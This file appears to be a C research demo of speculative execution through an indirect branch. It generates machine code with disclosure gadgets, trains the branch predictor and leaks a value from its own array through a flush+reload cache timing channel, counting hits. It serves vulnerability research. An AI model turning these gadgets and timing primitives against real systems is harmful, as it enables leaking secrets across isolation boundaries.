#define _GNU_SOURCE
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdint.h>
#include <sched.h>

// Comment this out to reproduce results for non-Intel processors.
#define INTEL_PLATFORM

// Length of the branch history; default is 100, which is enough for replication.
// Some processors track significantly longer history, so you may want to change it to 500.
// (If you make this too big, you'll run out of space and cause overlaps in the
//  generated code; see encode_spec_func.)
#define BRANCH_HIST_LEN 100

// The area of the executable region to allocate. You shouldn't need to change this
// unless you made the branch history too large (in which case fix the offsets too!).
#define EXE_SIZE 0x10000

// The flags passed to mmap when allocating the flush+reload region.
// Note that MAP_HUGETLB requires 2M pages.
#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)

// The stride between cache lines in the flush+reload region.
// We use a 4kB stride to minimize the influence of prefetchers.
#define STRIDE (4096)

// Reject timestamp counter measurements with a difference beyond this.
// Adjust this if you're triggering the valid_cnt assert.
#define MAX_REASONABLE_THRESHOLD 2000

// A pointer to memory containing the target of the indirect branch.
uint64_t *g_spec_jmp_target;
// Flush+reload buffer.
uint8_t *g_reload_buf;
// Flush+reload timing threshold (calibrated below).
uint64_t g_threshold_timing = 100;
// Array of data which the disclosure gadget will read.
uint32_t g_target_data[0x1000] = {0};

// total number of iteration in the demo test
uint64_t g_total_iter = 1000;



// Pointer to the code we'll dynamically generate below.
void (*g_spec_func)(int64_t offset, int64_t reload_buf_base, int64_t target_data) = NULL;

// ******************** disclosure gadgets ********************
// This is hardcoded into the generation code; by default, we use the 'universal_read_gdt'.
// Note that one-load gadgets may require you to adjust other code.

//0:  8b 0c 3e                mov    ecx,DWORD PTR [rsi+rdi*1]
unsigned char one_load_gdt[] = { 0x8B, 0x0C, 0x3E};

//0:  8b 0c 25 00 50 01 10    mov    ecx,DWORD PTR ds:0x10015000
unsigned char one_abs_load_gdt[] = { 0x8B, 0x0C, 0x25, 0x00, 0x50, 0x01, 0x10};

//0:  8b 1c 17                mov    ebx,DWORD PTR [rdi+rdx*1]
//a:  c1 e3 0c                shl    ebx,0xc
//d:  8b 0c 1e                mov    ecx,DWORD PTR [rsi+rbx*1]
unsigned char load_shift_load_gdt[] = { 0x8B, 0x1C, 0x17, 0xC1, 0xE3, 0x0C, 0x8B, 0x0C, 0x1E};

//0:  8b 1c 17                mov    ebx,DWORD PTR [rdi+rdx*1]
//d:  8b 0c 1e                mov    ecx,DWORD PTR [rsi+rbx*1]
unsigned char two_load_gdt[] = { 0x8B, 0x1C, 0x17, 0x8B, 0x0C, 0x1E};

//0:  8b 1c 17                mov    ebx,DWORD PTR [rdi+rdx*1]
//3:  48 81 e3 ff 00 00 00    and    rbx,0xff
//a:  c1 e3 0c                shl    ebx,0xc
//d:  8b 0c 1e                mov    ecx,DWORD PTR [rsi+rbx*1]
unsigned char universal_read_gdt[] = { 0x8B, 0x1C, 0x17, 0x48, 0x81, 0xE3, 0xFF, 0x00, 0x00, 0x00, 0xC1, 0xE3, 0x0C, 0x8B, 0x0C, 0x1E};

// ******************** asm snippets ********************
// These are small pieces of assembly code we use when generating executable code.

//0:  0f 84 30 00 00 00       je     0x36
unsigned char JE_forward[] = {0x0f,0x84, 0x30, 0x00, 0x00, 0x00};

//0:  48 b9 00 00 00 00 00    movabs rcx,0x0
//7:  00 00 00
unsigned char MOV_rcx_imm64[] = { 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

//0:  48 8b 09                mov    rcx,QWORD PTR [rcx]
unsigned char MOV_rcx_qptr_rcx[] = { 0x48, 0x8B, 0x09 };

//0:  0f ae e8                lfence
unsigned char LFENCE_ins[] = { 0x0F, 0xAE, 0xE8 };

//0:  ff e1                   jmp    rcx
unsigned char JMP_rcx[] = { 0xFF, 0xE1 };

//0:  f4                      hlt
unsigned char HLT_ins[] = { 0xF4 };

// This is prologue/epilogue code used by our generated code.

//0:  53                      push   rbx
//1:  51                      push   rcx
//2:  41 53                   push   r11
//4:  31 c9                   xor    ecx,ecx
unsigned char exe_prologue[] = { 0x53, 0x51, 0x41, 0x53, 0x31, 0xC9 };

//0:  41 5b                   pop    r11
//2:  59                      pop    rcx
//3:  5b                      pop    rbx
//4:  c3                      ret
unsigned char exe_epilogue[] = { 0x41, 0x5B, 0x59, 0x5B, 0xC3 };
	
// ******************** useful primitives ********************
// These are simple helper functions to perform flushes, fences, etc.

// Flush a cache line.
static inline void flush_cacheline(uint8_t *ptr)
{
	__asm__ __volatile__ ("clflush (%0)" : : "r" (ptr));
}

// Fence execution (both LFENCE and MFENCE).
static inline void fence_execution(void)
{
	__asm__ __volatile__ ("lfence;mfence");
}

// Touch a piece of memory (to bring the relevant line into the cache).
static inline void touch_cacheline(uint8_t *base, uint64_t offset)
{
	__asm__ __volatile__ ("movl (%0, %1), %%eax" : : "r" (base), "r" (offset) : "eax");
}

// Read the timestamp counter.
static inline uint64_t rdtscp(void)
{
	uint32_t a, d;
	__asm__ __volatile__ ("lfence; rdtsc" : "=a" (a), "=d" (d) : : "ebx", "ecx");
	return ((uint64_t)d << 32) | a;
}

// Time the cycles for the load at ptr.
static inline uint64_t time_load(uint8_t* ptr)
{
        uint64_t cycle;

        __asm__ __volatile__ ("lfence\n\t"
                "rdtsc\n\t"
                "shlq $32, %%rdx\n\t"
                "orq %%rdx,%%rax\n\t"
                "movq %%rax, %%rbx\n\t"
                "lfence\n\t"
                "movl (%1), %%eax\n\t"
                "lfence\n\t"
                "rdtsc\n\t"
                "shlq $32, %%rdx\n\t"
                "orq %%rdx,%%rax\n\t"
                "subq %%rbx, %%rax\n\t"
                "movq %%rax, %0\n\t"
                : "=m" (cycle)
                :"r"(ptr)
                : "rax", "rbx", "rcx", "rdx");

        return cycle;
}

// Return a random number.
static inline uint32_t rdrand(void)
{
	uint32_t rand;
	__asm__ __volatile__ ("rdrand %0" : "=r" (rand): :);
	return rand;
}

// Write some values to the flush+reload buffer.
// (In theory, this ensures you have unique backing pages.)
static void init_reload_buf(void)
{
	for (int i=0; i<256; i++) {
		g_reload_buf[i * STRIDE] = i;
	}
}

// Flush the entire flush+reload buffer.
static void flush_reload_buf(void)
{
	for (int i=0; i<256; i++) {
		flush_cacheline(g_reload_buf + (i * STRIDE));
	}
}

// Bring the entire flush+reload buffer into the cache.
// (This is used for timing calibration.)
static void cache_reload_buf(void)
{
	for (int i=0; i<256; i++) {
		touch_cacheline(g_reload_buf, i * STRIDE);
	}
}

// Serialization of timing/loads on some processors can be tricky.
// We use CPUID as a heavyweight serialization mechanism.
static inline void cpuid_serialize()
{
	unsigned int eax=1, ebx=0, ecx=0, edx=0;

	asm volatile("cpuid"
		: "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx)
		: "0" (&eax), "2" (&ecx));
}

// Load all the entries in the flush+reload buffer, and return the
// STRIDE index of the load which was fastest.
static int reload_and_measure(void)
{
	uint64_t min_val = UINT64_MAX;
	int min_i = -1;
	uint64_t count;
        uint8_t* ptr;

	for (int k=0;k<256; k++) {
		size_t i = ((k * 131) + 13) & (0xff);
		ptr = (uint8_t *)(g_reload_buf + i*STRIDE);
		cpuid_serialize();
                count = time_load(ptr);
		cpuid_serialize();

		if (count < min_val) {
			min_val = count;
			min_i = i;
		}

	}

	// Only return a value if it didn't exceed the threshold.
	if (min_val < g_threshold_timing)
		return min_i;

	return -1;
}

// Return the average timing for loads hitting cache (used for calibrating the threshold).
static int get_cached_timing(uint8_t* ptr)
{
        uint64_t sum = 0, valid_cnt = 0, count = 0;
        for ( int i = 0; i < 1000; i++){

                touch_cacheline(ptr, 0);
                fence_execution();
                cpuid_serialize();

                count = time_load(ptr);

                cpuid_serialize();
                fence_execution();


                if (count < MAX_REASONABLE_THRESHOLD) {
                        sum += count;
                        valid_cnt++;
                }
        }

        assert (valid_cnt != 0);
        return (sum / valid_cnt);

}

// Return the average timing for loads missing cache (used for calibrating the threshold).
static int get_uncached_timing(uint8_t* ptr)
{
        uint64_t sum = 0, valid_cnt = 0, count = 0;
        for ( int i = 0; i < 1000; i++){

                flush_cacheline(ptr);
                fence_execution();
                cpuid_serialize();

                count = time_load(ptr);

                cpuid_serialize();
                fence_execution();


                if (count < MAX_REASONABLE_THRESHOLD) {
                        sum += count;
                        valid_cnt++;
                }
        }

        assert (valid_cnt != 0);
        return (sum / valid_cnt);

}




/*
 * This function allocates an executable region if needed (stored in g_spec_func).
 */
void encode_spec_func(){

	int64_t experiment_offset;
	int64_t gadget_offset;
	uint8_t *exe_area;
	uint8_t *encode_ptr;

	// The code for the experiment starts at offset 0xa000.
	// Beware that you need space before this for the branch history normalization..!
	experiment_offset = 0xa000;

	// The gadget is placed at offset 0xc000, which is also the indirect branch target
	// during training rounds.
	gadget_offset = 0xc000;
	// Below, we add a prologue/epilogue, fill in other code, and then fill
	// in the rest of the region with NOPs:

	/*
	 * 0x0: prologue
	 * experiment_offset: The code with the indirect branch.
	 * gadget_offset: The code with the disclosure gadget.
	 * gadget_offset+0x1000: NOPs - this is the target when we're not training.
	 * end: epilogue (which returns).
	 */
	if (g_spec_func == NULL){
		// The address doesn't actually matter for this experiment.
		g_spec_func = mmap((void *)0x140000000, EXE_SIZE * 2, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
		if (g_spec_func == MAP_FAILED)
			err(1, "mmap failed");
	}

	// We start at the beginning of the region...
	encode_ptr = exe_area = (uint8_t *)g_spec_func;
	// ... and fill it with NOPs.
	memset(exe_area, 0x90, EXE_SIZE);

	// We add the prologue/epilogue at the start/end.
	memcpy(encode_ptr, exe_prologue, sizeof(exe_prologue));
	encode_ptr = exe_area + EXE_SIZE - sizeof(exe_epilogue);
	memcpy(encode_ptr, exe_epilogue, sizeof(exe_epilogue));

	// We start adding code at 0x40 past the epilogue, for no real reason.
	encode_ptr = exe_area + sizeof(exe_prologue) + 0x40;
	
	// We normalize branch history using a series of branches.
	// We put one branch per cache line to try to simplify things.
	for (int i=0; i < BRANCH_HIST_LEN; i++){
		memcpy(encode_ptr + i*0x40, JE_forward, sizeof(JE_forward));
	}

	assert(encode_ptr < exe_area + experiment_offset);

	// We put the actual experiment later, to give time for NOPs to resolve.
	encode_ptr = exe_area + experiment_offset;

	// 'movabs rcx, imm64' with the imm64 pointing to the memory
	// containing the target of the indirect branch.
	memcpy(encode_ptr, MOV_rcx_imm64, sizeof(MOV_rcx_imm64));
	*(int64_t *)(encode_ptr + 2) =  (int64_t) g_spec_jmp_target;

	// 'mov rcx, [rcx]' to load the indirect branch.
	encode_ptr += sizeof(MOV_rcx_imm64);	
	memcpy(encode_ptr, MOV_rcx_qptr_rcx, sizeof(MOV_rcx_qptr_rcx));
	encode_ptr += sizeof(MOV_rcx_qptr_rcx);	
	
#ifdef LFENCE
	// If LFENCE is enabled, add it.
	memcpy(encode_ptr, LFENCE_ins, sizeof(LFENCE_ins));
#endif

#ifdef INTEL_PLATFORM
	encode_ptr += 8;	
#endif

	// 'jmp rcx' is our indirect branch.
	encode_ptr += sizeof(LFENCE_ins);	
	memcpy(encode_ptr, JMP_rcx, sizeof(JMP_rcx));

	// .. what next? Oh, the gadget.

	// We add a 'hlt' before the disclosure gadget to prevent any speculative
	// execution into our disclosure gadget via fallthrough (e.g., SLS).
	encode_ptr = exe_area + gadget_offset - sizeof(HLT_ins);
	memcpy(encode_ptr, HLT_ins, sizeof(HLT_ins));

	// Finally, put the disclosure gadget at gadget_offset...
	encode_ptr = exe_area + gadget_offset;
	memcpy(encode_ptr, universal_read_gdt, sizeof(universal_read_gdt));

	// .. and use that as the default target.
	*g_spec_jmp_target = gadget_offset + (int64_t)exe_area;

}
	
	
void do_spec_demo(){
	
	uint64_t correct_cnt = 0;
	uint64_t noise_cnt = 0;
	uint8_t *dummy_buf = NULL;
	uint64_t cached_timing, uncached_timing;
	uint32_t target_idx;

	// Allocate a chunk of memory to store the indirect branch target.
	g_spec_jmp_target = malloc(4096);

	// This is most of the work (generate some code).
	encode_spec_func();

	// We allocate a dummy buffer that is different from the flush+reload buffer to be used for the training rounds.
	dummy_buf = malloc(STRIDE * 257);
	if(dummy_buf == NULL){
		printf("malloc failed!");
		exit(1);
	}
	memset(dummy_buf, 0, STRIDE * 257);

	// We allocate at a fixed address so we can use code like one_abs_load_gdt.
	// (You could also make that dynamic instead, but let's keep this simple.)
	g_reload_buf = mmap((void *)0x10000000, 2*STRIDE*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);
	if (g_reload_buf == MAP_FAILED)
		err(1, "mmap failed");
	init_reload_buf();
	
	printf("code at 0x%lx, flush_reload buffer at 0x%lx, dummy buffer at: 0x%lx\n", (uint64_t)g_spec_func, (uint64_t)g_reload_buf, (uint64_t)dummy_buf);

	// Put some random numbers in the target_data (which the gadget will read).
	for (int i = 0; i < sizeof(g_target_data) / 4; i++){
		g_target_data[i] = (i*173)%256;
	}

	// Pick a random index to read from.
	target_idx = rdrand() % (sizeof(g_target_data)/sizeof(int));

	// Here, we calibrate the timing for the covert channel by measuring
	// the timing difference between flushed and cached reads.
	// (This may not be too accurate due to e.g., frequency scaling,
	// but it's an acceptable for this example.)
	fence_execution();
	cpuid_serialize();
	cached_timing = get_cached_timing(dummy_buf);
	
	fence_execution();
	cpuid_serialize();
	uncached_timing = get_uncached_timing(dummy_buf);
	
	// Calculate the timing and print the result.
	g_threshold_timing = cached_timing + (uncached_timing - cached_timing)/3;
	if (g_threshold_timing > cached_timing + 60) {
		g_threshold_timing = cached_timing  + 60; 
	}
	printf("cached timing: %lu, uncached timing: %lu, threshold_timing: %lu\n", cached_timing, uncached_timing, g_threshold_timing);
	
	for(int k = 0; k < g_total_iter; k++) { 

		// First, the 'training' step.
		// We execute the indirect branch, with the disclosure gadget as the architectural target.
		// We pass a 'dummy' flush+reload buffer to avoid noise.
		for(int j = 0; j < 3; j++) { 
			g_spec_func(0, (uint64_t) dummy_buf, (uint64_t) g_target_data);
		}

		// We then flush the flush+reload buffer, ready for use as a covert channel.
		flush_reload_buf();

		// .. and update the architectural target of the indirect branch,
		// so that it will no longer execute the disclosure gadget.
		*g_spec_jmp_target += 0x1000;
		fence_execution();
		cpuid_serialize();
		
		// We then flush the indirect branch target, to create latency.
		// (Note that LFENCE/JMP should remove any data dependency.)
		flush_cacheline((uint8_t *)g_spec_jmp_target);
		touch_cacheline((uint8_t *)&g_target_data[target_idx], 0);
		fence_execution();
		cpuid_serialize();
		
		// Then we execute the indirect branch again.
		g_spec_func(target_idx*4, (uint64_t) g_reload_buf, (uint64_t) g_target_data);

		// Finally, we use flush+reload to read the value from the indirect target.
		int response = reload_and_measure();
		// Does it match? If so, this is a 'hit'.
		if (response == g_target_data[target_idx]) {
			correct_cnt++;
		} else if (response != -1){
			// If it didn't match, but we did get a transmitted value, count it as noise.
			noise_cnt++;
		}

		// Before the next iteration, we point the architectural target back at the
		// disclosure gadget.
		*g_spec_jmp_target -= 0x1000;

	} 

	// Print the number of hits, and we're done.
	printf("===========================================================\n");
	printf("total iter: %lu, hit count: %lu, noise count: %lu\n", g_total_iter, correct_cnt, noise_cnt);
}
	
	
int main(int argc, char **argv){

	int cpu = 1;
	cpu_set_t cpus;
	CPU_ZERO(&cpus);

        char c;
        while ((c = getopt (argc, argv, "c:n:")) != -1)
                switch (c) {
                        case 'c':
                                cpu = strtol (optarg, NULL, 0);
                                break;
                        case 'n':
                                g_total_iter = strtoul (optarg, NULL, 0);
                                break;
                        case '?':
                                if (optopt == 'c' || optopt == 'n')
                                        fprintf (stderr, "-%c requires an argument.\n", optopt);
                                else if (isprint (optopt))
                                        fprintf (stderr, "Unknown option `-%c'.\n", optopt);
                                else
                                        fprintf (stderr, "Unknown option `\\x%x'.\n", optopt);
                                return 1;
                        default:
                                abort();
                }

	// pin the experiment on a specific CPU	
	printf("Using CPU %i\n", cpu);
	CPU_SET(cpu, &cpus);
	int ret = sched_setaffinity(0, sizeof(cpus), &cpus);
	assert(ret==0);

	// Time for SCIENCE; execute the experiment.
	do_spec_demo();

}

